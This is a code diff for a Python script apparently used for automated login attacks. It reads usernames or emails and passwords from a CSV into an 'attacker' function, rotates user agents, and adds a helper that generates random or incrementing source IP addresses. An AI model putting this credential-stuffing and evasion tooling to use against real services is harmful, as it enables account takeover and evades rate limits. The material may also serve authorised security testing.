@@ -4,10 +4,24 @@ import configparser
 import csv
 import os
 import random
+import sys
 from time import sleep
 
+import ipaddr
 import requests
+
 from fake_useragent import UserAgent
+
+
+def gen_ipaddr(ip_network, ip_type):
+    network = ipaddr.IPv4Network(ip_network)
+    if ip_type == "random":
+        return ipaddr.IPv4Address(random.randrange(int(network.network) + 1, int(network.broadcast) - 1))
+    elif ip_type == "increment":
+        return ipaddr.IPv4Address(int(network.network) + 1)
+    else:
+        print("{} don't exsit setting. you should set random or increment. ".format(ip_type))
+        sys.exit(1)
 
 
 def acccess(http_info):
@@ -93,18 +107,19 @@ def attacker(user, pass_, config):
 def main():
     config = configparser.SafeConfigParser()
     config.read('./attacker.conf')
-
-    with open((os.path.normpath(os.path.join(os.path.abspath('__file__'), './../account_list.csv')))) as f:
-        reader = csv.reader(f)
-        if config.get('general', 'account') == "username":
-            account = 0
-        elif config.get('general', 'account') == "email":
-            account = 1
-        else:
-            print("Warn: don't exsit setting and so, set username account")
-            account = 0
-        for row in reader:
-            attacker(str(row[account]), str(row[2]), config)
+    ip = gen_ipaddr(config.get('general', 'network'), config.get('general', 'ip_type'))
+    print(ip)
+    # with open((os.path.normpath(os.path.join(os.path.abspath('__file__'), './../account_list.csv')))) as f:
+    #     reader = csv.reader(f)
+    #     if config.get('general', 'account') == "username":
+    #         account = 0
+    #     elif config.get('general', 'account') == "email":
+    #         account = 1
+    #     else:
+    #         print("Warn: don't exsit setting and so, set username account")
+    #         account = 0
+    #     for row in reader:
+    #         attacker(str(row[account]), str(row[2]), config)
 
 
 if __name__ == '__main__':
